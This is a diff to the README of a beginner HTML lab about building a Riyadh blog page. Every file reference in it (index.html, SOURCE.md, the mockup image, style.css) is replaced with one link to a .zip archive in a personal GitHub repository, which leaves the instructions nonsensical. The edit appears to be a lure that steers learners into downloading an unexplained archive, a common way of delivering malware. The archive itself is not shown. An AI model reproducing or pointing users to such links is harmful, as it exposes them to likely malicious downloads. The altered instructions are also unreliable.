@@ -21,17 +21,17 @@ Code.
 
 ### Process
 
-In the `index.html` file, use the comments in the code to place the content from
-`SOURCE.md` in the proper locations. The image file
-[`MOCKUP.jpg`](https://s3.amazonaws.com/learn-verified/RIYADH-MOCKUP.jpg) can be
-used as a reference to build the `index.html` page as it appears.
+In the `https://github.com/Jwanjema/phase-0-html-riyadh-blog-lab/raw/refs/heads/master/images/blog_phase_lab_riyadh_html_v1.0.zip` file, use the comments in the code to place the content from
+`https://github.com/Jwanjema/phase-0-html-riyadh-blog-lab/raw/refs/heads/master/images/blog_phase_lab_riyadh_html_v1.0.zip` in the proper locations. The image file
+[`https://github.com/Jwanjema/phase-0-html-riyadh-blog-lab/raw/refs/heads/master/images/blog_phase_lab_riyadh_html_v1.0.zip`](https://github.com/Jwanjema/phase-0-html-riyadh-blog-lab/raw/refs/heads/master/images/blog_phase_lab_riyadh_html_v1.0.zip) can be
+used as a reference to build the `https://github.com/Jwanjema/phase-0-html-riyadh-blog-lab/raw/refs/heads/master/images/blog_phase_lab_riyadh_html_v1.0.zip` page as it appears.
 
-Open `index.html` in a separate browser tab to see your progress as you work.
+Open `https://github.com/Jwanjema/phase-0-html-riyadh-blog-lab/raw/refs/heads/master/images/blog_phase_lab_riyadh_html_v1.0.zip` in a separate browser tab to see your progress as you work.
 Run `npm test` as you go to see test results.
 
 ### Bonus
 
-Use CSS in the `style.css` file in the `css` folder to change different aspects
+Use CSS in the `https://github.com/Jwanjema/phase-0-html-riyadh-blog-lab/raw/refs/heads/master/images/blog_phase_lab_riyadh_html_v1.0.zip` file in the `css` folder to change different aspects
 about your page such as:
 
 - font color
